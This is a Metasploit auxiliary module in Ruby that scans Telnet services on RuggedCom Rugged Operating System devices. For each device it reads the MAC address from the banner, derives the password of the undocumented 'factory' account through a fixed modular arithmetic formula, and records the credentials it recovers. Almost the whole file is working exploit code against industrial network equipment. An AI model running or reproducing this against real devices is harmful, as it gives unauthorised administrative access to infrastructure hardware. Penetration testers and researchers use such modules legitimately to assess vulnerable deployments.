require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Telnet
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'RuggedCom Telnet Password Generator',
			'Version'     => '$Revision:$',
			'Description' => %q{
				This module will calculate the password for the hidden username "factory" in the RuggedCom Rugged Operating
				System (ROS). The password is dynamically generated based on the devices MAC address.
				Orignal exploit: http://www.exploit-db.com/exploits/18779/.
			},
			'Author'      => ['Borja Merino <bmerinofe[at]gmail.com>'],
			'License'     => MSF_LICENSE
		)
		register_options(
		[
			Opt::RPORT(23),
			OptString.new('USERNAME', [ true, 'The username to authenticate as', 'factory']),
			OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30])
		], self.class)
	end

	def to
		return 30 if datastore['TIMEOUT'].to_i.zero?
		datastore['TIMEOUT'].to_i
	end

	def mac_to_password(mac)
		print_status ("MAC Address: #{mac}")
		mac_clean = mac.gsub("-","")
		mac_reverse = mac_clean.each_char.each_slice(2).to_a.reverse.join
		mac_reverse << "0000"
		pass = mac_reverse.hex % 999999929
		print_status ("Password: #{pass}")
		return pass.to_s
	end

	def get_info(banner)
		product = banner.match(/Product:\s*\S*/)[0]
		so_version = banner.match(/Rugged Operating System\s\S*/)[0]
		return so_version << "  " << product
	end

	def run_host(ip)
		begin
			::Timeout.timeout(to) do
				res = connect
				banner_santized = Rex::Text.to_hex_ascii(banner.to_s)
				if banner_santized =~ /Rugged Operating System/
					print_status("#{ip}:#{rport} Calculating Telnet password ...")
					mac  = banner_santized.match(/((?:[0-9a-f]{2}[-]){5}[0-9a-f]{2})/i)[0]
					password = mac_to_password(mac)
					info = get_info(banner_santized)
					report_auth_info(
						:host  => rhost,
						:port => rport,
						:sname => 'telnet',
						:user => 'factory',
						:pass => password,
						:source_type => "user_supplied",
						:active => true
					)
					break
				else
					print_status("It doesn't seem to be a RuggedCom service.")
					break
				end
		end

		rescue ::Rex::ConnectionError
		rescue Timeout::Error
			print_error("#{target_host}:#{rport}, Server timed out after #{to} seconds. Skipping.")
		rescue ::Exception => e
			print_error("#{e} #{e.backtrace}")
		end
	end
end
